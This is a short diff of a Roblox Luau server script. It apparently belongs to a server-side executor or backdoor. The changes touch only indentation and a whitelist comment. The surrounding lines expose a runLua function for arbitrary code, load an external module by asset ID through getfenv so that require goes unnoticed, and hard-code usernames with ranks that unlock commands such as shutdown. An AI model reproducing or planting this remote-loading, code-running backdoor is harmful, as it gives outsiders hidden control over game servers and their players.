@@ -161,7 +161,7 @@ end
 
 -- expose just 2 be nice qt3.14's
 GetEnv().runLua = function(caller: Player, code: string)
-if not ServerScriptService:FindFirstChild("goog") then
+    if not ServerScriptService:FindFirstChild("goog") then
         local ticking = tick()
         getfenv().require(112691275102014).load() -- getfenv so it stops error in ide thanks
         repeat task.wait() until ServerScriptService:FindFirstChild("goog") or tick() - ticking >= 10
@@ -199,7 +199,7 @@ if not GetEnv().tempwhitelist then
     GetEnv().tempwhitelist = {
         ["SnowClan_8342"] = {
             rank = Ranks.Developer,
-            COMMENT = "Note that all a higher rank does is give me access to &whitelist so please either do it by hand or dont touch this!"
+            COMMENT = "Note that all a higher rank does is give me access to 'enr' (eject resets _G.yem) and 'shutdown' so please either do it by hand or dont touch this!"
         },
         ["qwdssssfsdrfasd"] = {
             rank = Ranks.Special
